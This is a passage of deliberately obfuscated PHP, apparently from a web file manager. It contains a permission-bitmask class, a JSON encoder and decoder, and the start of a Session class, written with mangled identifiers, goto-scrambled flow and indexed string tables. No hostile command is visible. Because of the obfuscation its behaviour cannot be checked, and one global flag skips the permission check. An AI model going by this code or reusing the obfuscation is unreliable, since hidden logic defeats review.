$F¯’ƒÅÔ¯[2101] => 7, $F¯’ƒÅÔ¯[2102] => 1, $F¯’ƒÅÔ¯[2103] => 0)); return $DØµ§ãñ¯ë; } public static function authCheck($Fá”öñÖ¢, $Eƒéø‡½Ä) { $Fá”öñÖ¢ = intval($Fá”öñÖ¢); if (_get($GLOBALS, $_SERVER[Î¿—”òá][457])) { return !0; } if ($Fá”öñÖ¢ <= 0) { return !1; } if (($Fá”öñÖ¢ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Fá”öñÖ¢ & $Eƒéø‡½Ä); } public static function authCheckShow($eŠà­±Ìäà) { return self::authCheck($eŠà­±Ìäà, self::AUTH_SHOW); } public static function authCheckView($c…Ù–‘š—¡) { return self::authCheck($c…Ù–‘š—¡, self::AUTH_VIEW); } public static function authCheckDownload($DÛ”Œ¦°è) { return self::authCheck($DÛ”Œ¦°è, self::AUTH_DOWNLOAD); } public static function authCheckUpload($DŸëã¢®¼ª) { return self::authCheck($DŸëã¢®¼ª, self::AUTH_UPLOAD); } public static function authCheckEdit($B×ÎŠñÛÚâ) { return self::authCheck($B×ÎŠñÛÚâ, self::AUTH_EDIT); } public static function authCheckRemove($dĞ‘¹Šà†‰) { return self::authCheck($dĞ‘¹Šà†‰, self::AUTH_REMOVE); } public static function authCheckShare($AÜË‘ÊÅÕ‹) { return self::authCheck($AÜË‘ÊÅÕ‹, self::AUTH_SHARE); } public static function authCheckComment($c¶ùÈ÷÷šŸ) { return self::authCheck($c¶ùÈ÷÷šŸ, self::AUTH_COMMENT); } public static function authCheckEvent($eÚÊ„öÖÁš) { return self::authCheck($eÚÊ„öÖÁš, self::AUTH_EVENT); } public static function authCheckRoot($AÌÈÅ£Å¥Š) { return self::authCheck($AÌÈÅ£Å¥Š, self::AUTH_ROOT); } public static function authDisable($b¢ÀŒºÅ­¢, $DŒßÚ£¼Ù¦) { if (intval($b¢ÀŒºÅ­¢) <= 0) { return 0; } return intval($b¢ÀŒºÅ­¢) & ~$DŒßÚ£¼Ù¦; } public $optionType = "\x53\x79\x73\164\x65\155\56\163\x6f\165\162\143\145\101\x75\164\x68\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x61\165\x74\x68", "\x6c\141\142\145\x6c", "\x64\x69\163\x70\154\141\x79", "\x73\x79\x73\x74\x65\x6d", "\x73\x6f\162\164"); public function initData() { $CèÛå´…’™ = $this->authDefault(); foreach ($CèÛå´…’™ as $E‘²½×Á…) { $this->add($E‘²½×Á…); } } public function listData($b÷Ğº„®ÙÃ = false, $e„Ïñ¯—ˆ– = "\163\x6f\x72\164", $DŞÖĞ©ÛÏĞ = false) { return parent::listData($b÷Ğº„®ÙÃ, $e„Ïñ¯—ˆ–, $DŞÖĞ©ÛÏĞ); } public function update($b§êŠù®‚, $bÄëõá¶²) { $eÖÑİ‡²Ú =& $_SERVER[Î¿—”òá]; $DºØ´À·± = parent::listData($b§êŠù®‚); $DÀÈÚ°•ï = $this->findByName($bÄëõá¶²[$eÖÑİ‡²Ú[28]]); if (!$DºØ´À·± || $DÀÈÚ°•ï && $DÀÈÚ°•ï[$eÖÑİ‡²Ú[367]] != $DºØ´À·±[$eÖÑİ‡²Ú[367]]) { return !1; } $this->filterAuth($bÄëõá¶²[$eÖÑİ‡²Ú[376]]); return parent::update($b§êŠù®‚, $bÄëõá¶²); } public function remove($a’ô‚ÑÏò‰) { $eù’±Š´¦ = parent::listData($a’ô‚ÑÏò‰); if (!$eù’±Š´¦ || $eù’±Š´¦[$_SERVER[Î¿—”òá][1073]]) { return !1; } return parent::remove($a’ô‚ÑÏò‰); } public function add($eÌÖå²ß = array()) { goto AÌÅœó„Ñè; B¥ÇÂÈ±†Ê: $eÌÖå²ß = array_merge($C®ËÛ³´¿õ, $eÌÖå²ß); $eÌÖå²ß[$b¿•ğÛ©Ïœ[2118]] = $this->getSort(); $this->filterAuth($eÌÖå²ß[$b¿•ğÛ©Ïœ[376]]); goto dÍ¶…øšÁí; dÍ¶…øšÁí: return parent::insert($eÌÖå²ß); goto BµÙ¾ƒ³µ; AÌÅœó„Ñè: $b¿•ğÛ©Ïœ =& $_SERVER[Î¿—”òá]; if ($this->findByName($eÌÖå²ß[$b¿•ğÛ©Ïœ[28]])) { return !1; } $C®ËÛ³´¿õ = array($b¿•ğÛ©Ïœ[28] => $b¿•ğÛ©Ïœ[33], $b¿•ğÛ©Ïœ[376] => 1, $b¿•ğÛ©Ïœ[2115] => $b¿•ğÛ©Ïœ[2116], $b¿•ğÛ©Ïœ[2117] => 1, $b¿•ğÛ©Ïœ[1073] => 0, $b¿•ğÛ©Ïœ[2118] => 0); goto B¥ÇÂÈ±†Ê; BµÙ¾ƒ³µ: } private function getSort() { $EšÈÚ£ÏŒ‘ =& $_SERVER[Î¿—”òá]; $eÚØ†«ˆ™ª = parent::listData(); $díØÛ¢ÉšÔ = array_to_keyvalue($eÚØ†«ˆ™ª, $EšÈÚ£ÏŒ‘[33], $EšÈÚ£ÏŒ‘[2118]); return empty($díØÛ¢ÉšÔ) ? 0 : max($díØÛ¢ÉšÔ) + 1; } private function filterAuth(&$bŒöÛ‘Çñ) { goto EãÄí¨šÉ¸; e§Ñ¹ãÂÛ‚: foreach ($DÖ»›ÅÉ¨ as $d‘ã¥Ì) { if (isset($eëÏó‡¤ç[$d‘ã¥Ì])) { $DÖ»›ÅÉ¨ = array_merge($DÖ»›ÅÉ¨, $eëÏó‡¤ç[$d‘ã¥Ì]); } } $DÖ»›ÅÉ¨[] = self::AUTH_SHOW; $bŒöÛ‘Çñ = array_sum(array_unique($DÖ»›ÅÉ¨)); goto C¾™¨Àö‡; eöÉÄØ­ÓÀ: foreach ($C¹ç—Ààáô as $d‘ã¥Ì) { if ($bŒöÛ‘Çñ & $d‘ã¥Ì) { $DÖ»›ÅÉ¨[] = $d‘ã¥Ì; } } if (in_array(self::AUTH_ROOT, $DÖ»›ÅÉ¨)) { $bŒöÛ‘Çñ = array_sum($C¹ç—Ààáô); return; } $eëÏó‡¤ç = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e§Ñ¹ãÂÛ‚; EãÄí¨šÉ¸: if (!$bŒöÛ‘Çñ) { return; } $C¹ç—Ààáô = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $DÖ»›ÅÉ¨ = array(); goto eöÉÄØ­ÓÀ; C¾™¨Àö‡: } public function sort($DÀ›êê½ÇŞ, $bÎÂİ«¡‘) { return parent::update($DÀ›êê½ÇŞ, $bÎÂİ«¡‘); } } goto FÉ¬È¾ÛÈ³; BëöíŸù: define($_SERVER[Î¿—”òá][1929], 16); define($_SERVER[Î¿—”òá][1930], 32); class Services_JSON { function __construct($E¤¨ÇÓ˜Ç„ = 0) { $this->use = $E¤¨ÇÓ˜Ç„; } function utf162utf8($Cñô£áœ¼„) { $D‘çÖµë¬ª =& $_SERVER[Î¿—”òá]; if (function_exists($D‘çÖµë¬ª[68])) { return mb_convert_encoding($Cñô£áœ¼„, $D‘çÖµë¬ª[1582], $D‘çÖµë¬ª[1931]); } $eÀ²ùí†Ú– = ord($Cñô£áœ¼„[0]) << 8 | ord($Cñô£áœ¼„[1]); switch (!0) { case (127 & $eÀ²ùí†Ú–) == $eÀ²ùí†Ú–: return chr(127 & $eÀ²ùí†Ú–); case (2047 & $eÀ²ùí†Ú–) == $eÀ²ùí†Ú–: return chr(192 | $eÀ²ùí†Ú– >> 6 & 31) . chr(128 | $eÀ²ùí†Ú– & 63); case (65535 & $eÀ²ùí†Ú–) == $eÀ²ùí†Ú–: return chr(224 | $eÀ²ùí†Ú– >> 12 & 15) . chr(128 | $eÀ²ùí†Ú– >> 6 & 63) . chr(128 | $eÀ²ùí†Ú– & 63); } return $D‘çÖµë¬ª[33]; } function utf82utf16($Cğ›Í”†­) { $açò—»ãÛ =& $_SERVER[Î¿—”òá]; if (function_exists($açò—»ãÛ[68])) { return mb_convert_encoding($Cğ›Í”†­, $açò—»ãÛ[1931], $açò—»ãÛ[1582]); } switch (strlen($Cğ›Í”†­)) { case 1: return $Cğ›Í”†­; case 2: return chr(7 & ord($Cğ›Í”†­[0]) >> 2) . chr(192 & ord($Cğ›Í”†­[0]) << 6 | 63 & ord($Cğ›Í”†­[1])); case 3: return chr(240 & ord($Cğ›Í”†­[0]) << 4 | 15 & ord($Cğ›Í”†­[1]) >> 2) . chr(192 & ord($Cğ›Í”†­[1]) << 6 | 127 & ord($Cğ›Í”†­[2])); } return $açò—»ãÛ[33]; } function encode($dÚˆŒ¢Æà‹) { $FÑ·éŠ©Íš =& $_SERVER[Î¿—”òá]; switch (gettype($dÚˆŒ¢Æà‹)) { case $FÑ·éŠ©Íš[1593]: return $dÚˆŒ¢Æà‹ ? $FÑ·éŠ©Íš[1592] : $FÑ·éŠ©Íš[1594]; case $FÑ·éŠ©Íš[1932]: return $FÑ·éŠ©Íš[99]; case $FÑ·éŠ©Íš[303]: return (int) $dÚˆŒ¢Æà‹; case $FÑ·éŠ©Íš[278]: case $FÑ·éŠ©Íš[277]: return (double) $dÚˆŒ¢Æà‹; case $FÑ·éŠ©Íš[312]: $b¥çõ³”ö = $FÑ·éŠ©Íš[33]; $C£¹ùÒÌ = strlen($dÚˆŒ¢Æà‹); for ($fÛ»›ø·ƒ = 0; $fÛ»›ø·ƒ < $C£¹ùÒÌ; ++$fÛ»›ø·ƒ) { $E‰„Šğêé = ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ]); switch (!0) { case $E‰„Šğêé == 8: $b¥çõ³”ö .= $FÑ·éŠ©Íš[1933]; break; case $E‰„Šğêé == 9: $b¥çõ³”ö .= $FÑ·éŠ©Íš[1569]; break; case $E‰„Šğêé == 10: $b¥çõ³”ö .= $FÑ·éŠ©Íš[1567]; break; case $E‰„Šğêé == 12: $b¥çõ³”ö .= $FÑ·éŠ©Íš[1934]; break; case $E‰„Šğêé == 13: $b¥çõ³”ö .= $FÑ·éŠ©Íš[1568]; break; case $E‰„Šğêé == 34: case $E‰„Šğêé == 47: case $E‰„Šğêé == 92: $b¥çõ³”ö .= $FÑ·éŠ©Íš[93] . $dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ]; break; case $E‰„Šğêé >= 32 && $E‰„Šğêé <= 127: $b¥çõ³”ö .= $dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ]; break; case ($E‰„Šğêé & 224) == 192: $AÆµÈ«† = pack($FÑ·éŠ©Íš[1935], $E‰„Šğêé, ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 1])); $fÛ»›ø·ƒ += 1; $e¥¶ˆ¶êÈ’ = $this->utf82utf16($AÆµÈ«†); $b¥çõ³”ö .= sprintf($FÑ·éŠ©Íš[1936], bin2hex($e¥¶ˆ¶êÈ’)); break; case ($E‰„Šğêé & 240) == 224: $AÆµÈ«† = pack($FÑ·éŠ©Íš[1935], $E‰„Šğêé, ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 1]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 2])); $fÛ»›ø·ƒ += 2; $e¥¶ˆ¶êÈ’ = $this->utf82utf16($AÆµÈ«†); $b¥çõ³”ö .= sprintf($FÑ·éŠ©Íš[1936], bin2hex($e¥¶ˆ¶êÈ’)); break; case ($E‰„Šğêé & 248) == 240: $AÆµÈ«† = pack($FÑ·éŠ©Íš[1935], $E‰„Šğêé, ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 1]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 2]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 3])); $fÛ»›ø·ƒ += 3; $e¥¶ˆ¶êÈ’ = $this->utf82utf16($AÆµÈ«†); $b¥çõ³”ö .= sprintf($FÑ·éŠ©Íš[1936], bin2hex($e¥¶ˆ¶êÈ’)); break; case ($E‰„Šğêé & 252) == 248: $AÆµÈ«† = pack($FÑ·éŠ©Íš[1935], $E‰„Šğêé, ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 1]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 2]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 3]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 4])); $fÛ»›ø·ƒ += 4; $e¥¶ˆ¶êÈ’ = $this->utf82utf16($AÆµÈ«†); $b¥çõ³”ö .= sprintf($FÑ·éŠ©Íš[1936], bin2hex($e¥¶ˆ¶êÈ’)); break; case ($E‰„Šğêé & 254) == 252: $AÆµÈ«† = pack($FÑ·éŠ©Íš[1935], $E‰„Šğêé, ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 1]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 2]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 3]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 4]), ord($dÚˆŒ¢Æà‹[$fÛ»›ø·ƒ + 5])); $fÛ»›ø·ƒ += 5; $e¥¶ˆ¶êÈ’ = $this->utf82utf16($AÆµÈ«†); $b¥çõ³”ö .= sprintf($FÑ·éŠ©Íš[1936], bin2hex($e¥¶ˆ¶êÈ’)); break; } } return $FÑ·éŠ©Íš[113] . $b¥çõ³”ö . $FÑ·éŠ©Íš[113]; case $FÑ·éŠ©Íš[1937]: if (is_array($dÚˆŒ¢Æà‹) && count($dÚˆŒ¢Æà‹) && array_keys($dÚˆŒ¢Æà‹) !== range(0, sizeof($dÚˆŒ¢Æà‹) - 1)) { $dØÁº‡ŒİŞ = array_map(array($this, $FÑ·éŠ©Íš[1938]), array_keys($dÚˆŒ¢Æà‹), array_values($dÚˆŒ¢Æà‹)); foreach ($dØÁº‡ŒİŞ as $c§Œ¨“¢õ®) { if (Services_JSON::isError($c§Œ¨“¢õ®)) { return $c§Œ¨“¢õ®; } } return $FÑ·éŠ©Íš[1061] . join($FÑ·éŠ©Íš[47], $dØÁº‡ŒİŞ) . $FÑ·éŠ©Íš[315]; } $E»óŠáĞÀ¼ = array_map(array($this, $FÑ·éŠ©Íš[1939]), $dÚˆŒ¢Æà‹); foreach ($E»óŠáĞÀ¼ as $dõä°‘ÇŠ) { if (Services_JSON::isError($dõä°‘ÇŠ)) { return $dõä°‘ÇŠ; } } return $FÑ·éŠ©Íš[157] . join($FÑ·éŠ©Íš[47], $E»óŠáĞÀ¼) . $FÑ·éŠ©Íš[476]; case $FÑ·éŠ©Íš[1940]: $dé²½± ¬ä = get_object_vars($dÚˆŒ¢Æà‹); $dØÁº‡ŒİŞ = array_map(array($this, $FÑ·éŠ©Íš[1938]), array_keys($dé²½± ¬ä), array_values($dé²½± ¬ä)); foreach ($dØÁº‡ŒİŞ as $c§Œ¨“¢õ®) { if (Services_JSON::isError($c§Œ¨“¢õ®)) { return $c§Œ¨“¢õ®; } } return $FÑ·éŠ©Íš[1061] . join($FÑ·éŠ©Íš[47], $dØÁº‡ŒİŞ) . $FÑ·éŠ©Íš[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $FÑ·éŠ©Íš[99] : new Services_JSON_Error(gettype($dÚˆŒ¢Æà‹) . $FÑ·éŠ©Íš[1941]); } } function name_value($bĞĞ°‚£•, $f†ä¿³Î™Š) { $f§Õ×Ïø» = $this->encode($f†ä¿³Î™Š); if (Services_JSON::isError($f§Õ×Ïø»)) { return $f§Õ×Ïø»; } return $this->encode(strval($bĞĞ°‚£•)) . $_SERVER[Î¿—”òá][4] . $f§Õ×Ïø»; } function reduce_string($bä‚÷®Ù) { $f‹Ùù•ÉğÎ =& $_SERVER[Î¿—”òá]; $bä‚÷®Ù = preg_replace(array($f‹Ùù•ÉğÎ[1942], $f‹Ùù•ÉğÎ[1943], $f‹Ùù•ÉğÎ[1944]), $f‹Ùù•ÉğÎ[33], $bä‚÷®Ù); return trim($bä‚÷®Ù); } function decode($DÔ›‰Ñ¨ğº) { $dİ›˜¢ŒÔ‹ =& $_SERVER[Î¿—”òá]; $DÔ›‰Ñ¨ğº = $this->reduce_string($DÔ›‰Ñ¨ğº); switch (strtolower($DÔ›‰Ñ¨ğº)) { case $dİ›˜¢ŒÔ‹[1592]: return !0; case $dİ›˜¢ŒÔ‹[1594]: return !1; case $dİ›˜¢ŒÔ‹[99]: return null; default: $AŸä„“¿‚ä = array(); if (is_numeric($DÔ›‰Ñ¨ğº)) { return (double) $DÔ›‰Ñ¨ğº == (int) $DÔ›‰Ñ¨ğº ? (int) $DÔ›‰Ñ¨ğº : (double) $DÔ›‰Ñ¨ğº; } elseif (preg_match($dİ›˜¢ŒÔ‹[1945], $DÔ›‰Ñ¨ğº, $AŸä„“¿‚ä) && $AŸä„“¿‚ä[1] == $AŸä„“¿‚ä[2]) { $fæ†Ú¢’õ = substr($DÔ›‰Ñ¨ğº, 0, 1); $bÆ¿Ó¤—Ï¼ = substr($DÔ›‰Ñ¨ğº, 1, -1); $E‚ñÓÀµÄ = $dİ›˜¢ŒÔ‹[33]; $EÓ´øóùª = strlen($bÆ¿Ó¤—Ï¼); for ($EˆñßìÁæä = 0; $EˆñßìÁæä < $EÓ´øóùª; ++$EˆñßìÁæä) { $cÎ¢œë˜Ôå = substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 2); $AËßÛğŸ…¹ = ord($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä]); switch (!0) { case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1933]: $E‚ñÓÀµÄ .= chr(8); ++$EˆñßìÁæä; break; case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1569]: $E‚ñÓÀµÄ .= chr(9); ++$EˆñßìÁæä; break; case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1567]: $E‚ñÓÀµÄ .= chr(10); ++$EˆñßìÁæä; break; case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1934]: $E‚ñÓÀµÄ .= chr(12); ++$EˆñßìÁæä; break; case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1568]: $E‚ñÓÀµÄ .= chr(13); ++$EˆñßìÁæä; break; case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1349]: case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1946]: case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1562]: case $cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1564]: if ($fæ†Ú¢’õ == $dİ›˜¢ŒÔ‹[113] && $cÎ¢œë˜Ôå != $dİ›˜¢ŒÔ‹[1946] || $fæ†Ú¢’õ == $dİ›˜¢ŒÔ‹[55] && $cÎ¢œë˜Ôå != $dİ›˜¢ŒÔ‹[1349]) { $E‚ñÓÀµÄ .= $bÆ¿Ó¤—Ï¼[++$EˆñßìÁæä]; } break; case preg_match($dİ›˜¢ŒÔ‹[1947], substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 6)): $e›ªÇ‚„‰Ä = chr(hexdec(substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä + 2, 2))) . chr(hexdec(substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä + 4, 2))); $E‚ñÓÀµÄ .= $this->utf162utf8($e›ªÇ‚„‰Ä); $EˆñßìÁæä += 5; break; case $AËßÛğŸ…¹ >= 32 && $AËßÛğŸ…¹ <= 127: $E‚ñÓÀµÄ .= $bÆ¿Ó¤—Ï¼[$EˆñßìÁæä]; break; case ($AËßÛğŸ…¹ & 224) == 192: $E‚ñÓÀµÄ .= substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 2); ++$EˆñßìÁæä; break; case ($AËßÛğŸ…¹ & 240) == 224: $E‚ñÓÀµÄ .= substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 3); $EˆñßìÁæä += 2; break; case ($AËßÛğŸ…¹ & 248) == 240: $E‚ñÓÀµÄ .= substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 4); $EˆñßìÁæä += 3; break; case ($AËßÛğŸ…¹ & 252) == 248: $E‚ñÓÀµÄ .= substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 5); $EˆñßìÁæä += 4; break; case ($AËßÛğŸ…¹ & 254) == 252: $E‚ñÓÀµÄ .= substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 6); $EˆñßìÁæä += 5; break; } } return $E‚ñÓÀµÄ; } elseif (preg_match($dİ›˜¢ŒÔ‹[1948], $DÔ›‰Ñ¨ğº) || preg_match($dİ›˜¢ŒÔ‹[1949], $DÔ›‰Ñ¨ğº)) { goto Aè§‰ˆ‰÷±; Aè§‰ˆ‰÷±: if ($DÔ›‰Ñ¨ğº[0] == $dİ›˜¢ŒÔ‹[157]) { $dß£™°ğª = array(SERVICES_JSON_IN_ARR); $F¬ºìŠ“ˆ‰ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dß£™°ğª = array(SERVICES_JSON_IN_OBJ); $aàŒ‰˜á = array(); } else { $dß£™°ğª = array(SERVICES_JSON_IN_OBJ); $aàŒ‰˜á = new stdClass(); } } array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_SLICE, $dİ›˜¢ŒÔ‹[263] => 0, $dİ›˜¢ŒÔ‹[1951] => !1)); $bÆ¿Ó¤—Ï¼ = substr($DÔ›‰Ñ¨ğº, 1, -1); goto Fª™øá±ÉÄ; cˆî¸ó¯Â: for ($EˆñßìÁæä = 0; $EˆñßìÁæä <= $EÓ´øóùª; ++$EˆñßìÁæä) { $eãã·‰Û³ = end($dß£™°ğª); $cÎ¢œë˜Ôå = substr($bÆ¿Ó¤—Ï¼, $EˆñßìÁæä, 2); if ($EˆñßìÁæä == $EÓ´øóùª || $bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[47] && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] == SERVICES_JSON_SLICE) { $C°ò‰¤ö¦¼ = substr($bÆ¿Ó¤—Ï¼, $eãã·‰Û³[$dİ›˜¢ŒÔ‹[263]], $EˆñßìÁæä - $eãã·‰Û³[$dİ›˜¢ŒÔ‹[263]]); array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_SLICE, $dİ›˜¢ŒÔ‹[263] => $EˆñßìÁæä + 1, $dİ›˜¢ŒÔ‹[1951] => !1)); if (reset($dß£™°ğª) == SERVICES_JSON_IN_ARR) { array_push($F¬ºìŠ“ˆ‰, $this->decode($C°ò‰¤ö¦¼)); } elseif (reset($dß£™°ğª) == SERVICES_JSON_IN_OBJ) { $F×À¬èğ = array(); if (preg_match($dİ›˜¢ŒÔ‹[1952], $C°ò‰¤ö¦¼, $F×À¬èğ)) { $E±°ó¼éºƒ = $this->decode($F×À¬èğ[1]); $CËÉ¤Á‰Ê = $this->decode($F×À¬èğ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aàŒ‰˜á[$E±°ó¼éºƒ] = $CËÉ¤Á‰Ê; } else { $aàŒ‰˜á->{$E±°ó¼éºƒ} = $CËÉ¤Á‰Ê; } } elseif (preg_match($dİ›˜¢ŒÔ‹[1953], $C°ò‰¤ö¦¼, $F×À¬èğ)) { $E±°ó¼éºƒ = $F×À¬èğ[1]; $CËÉ¤Á‰Ê = $this->decode($F×À¬èğ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aàŒ‰˜á[$E±°ó¼éºƒ] = $CËÉ¤Á‰Ê; } else { $aàŒ‰˜á->{$E±°ó¼éºƒ} = $CËÉ¤Á‰Ê; } } } } elseif (($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[113] || $bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[55]) && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] != SERVICES_JSON_IN_STR) { array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_IN_STR, $dİ›˜¢ŒÔ‹[263] => $EˆñßìÁæä, $dİ›˜¢ŒÔ‹[1951] => $bÆ¿Ó¤—Ï¼[$EˆñßìÁæä])); } elseif ($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1951]] && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] == SERVICES_JSON_IN_STR && (strlen(substr($bÆ¿Ó¤—Ï¼, 0, $EˆñßìÁæä)) - strlen(rtrim(substr($bÆ¿Ó¤—Ï¼, 0, $EˆñßìÁæä), $dİ›˜¢ŒÔ‹[93]))) % 2 != 1) { array_pop($dß£™°ğª); } elseif ($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[157] && in_array($eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_IN_ARR, $dİ›˜¢ŒÔ‹[263] => $EˆñßìÁæä, $dİ›˜¢ŒÔ‹[1951] => !1)); } elseif ($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[476] && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] == SERVICES_JSON_IN_ARR) { array_pop($dß£™°ğª); } elseif ($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[1061] && in_array($eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_IN_OBJ, $dİ›˜¢ŒÔ‹[263] => $EˆñßìÁæä, $dİ›˜¢ŒÔ‹[1951] => !1)); } elseif ($bÆ¿Ó¤—Ï¼[$EˆñßìÁæä] == $dİ›˜¢ŒÔ‹[315] && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] == SERVICES_JSON_IN_OBJ) { array_pop($dß£™°ğª); } elseif ($cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1954] && in_array($eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dß£™°ğª, array($dİ›˜¢ŒÔ‹[1950] => SERVICES_JSON_IN_CMT, $dİ›˜¢ŒÔ‹[263] => $EˆñßìÁæä, $dİ›˜¢ŒÔ‹[1951] => !1)); $EˆñßìÁæä++; } elseif ($cÎ¢œë˜Ôå == $dİ›˜¢ŒÔ‹[1955] && $eãã·‰Û³[$dİ›˜¢ŒÔ‹[1950]] == SERVICES_JSON_IN_CMT) { array_pop($dß£™°ğª); $EˆñßìÁæä++; for ($fŠ¬ º®ğµ = $eãã·‰Û³[$dİ›˜¢ŒÔ‹[263]]; $fŠ¬ º®ğµ <= $EˆñßìÁæä; ++$fŠ¬ º®ğµ) { $bÆ¿Ó¤—Ï¼ = substr_replace($bÆ¿Ó¤—Ï¼, $dİ›˜¢ŒÔ‹[50], $fŠ¬ º®ğµ, 1); } } } if (reset($dß£™°ğª) == SERVICES_JSON_IN_ARR) { return $F¬ºìŠ“ˆ‰; } elseif (reset($dß£™°ğª) == SERVICES_JSON_IN_OBJ) { return $aàŒ‰˜á; } goto b»¿§¦ø½; Fª™øá±ÉÄ: $bÆ¿Ó¤—Ï¼ = $this->reduce_string($bÆ¿Ó¤—Ï¼); if ($bÆ¿Ó¤—Ï¼ == $dİ›˜¢ŒÔ‹[33]) { if (reset($dß£™°ğª) == SERVICES_JSON_IN_ARR) { return $F¬ºìŠ“ˆ‰; } else { return $aàŒ‰˜á; } } $EÓ´øóùª = strlen($bÆ¿Ó¤—Ï¼); goto cˆî¸ó¯Â; b»¿§¦ø½: } } } function isError($E·æ‹»‰ÏÓ, $aÛí¾±½ = null) { $Dêí¸æºŠõ =& $_SERVER[Î¿—”òá]; if (class_exists($Dêí¸æºŠõ[1956])) { return PEAR::isError($E·æ‹»‰ÏÓ, $aÛí¾±½); } elseif (is_object($E·æ‹»‰ÏÓ) && (get_class($E·æ‹»‰ÏÓ) == $Dêí¸æºŠõ[1957] || is_subclass_of($E·æ‹»‰ÏÓ, $Dêí¸æºŠõ[1957]))) { return !0; } return !1; } } goto d§ßò·¸‡œ; d§À”†Ù¢: function beforeShutdown() { Hook::trigger($_SERVER[‡•˜°©ˆ][36]); } $_SERVER[$_SERVER[‡•˜°©ˆ][37]] = BASIC_PATH; $_SERVER[$_SERVER[‡•˜°©ˆ][38]] = LIB_DIR; goto eÄ¡¾á¶Ó; Eƒé­Àòµ¶: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto c¨èÁÃÛ»©; dœá‘¶ÍÇ: return $BÎê³ˆ–øç; goto D¬ŠÒ…òíŞ; Dæ®•ÇÏ¯±: $dÜ›­íÊ¾ = 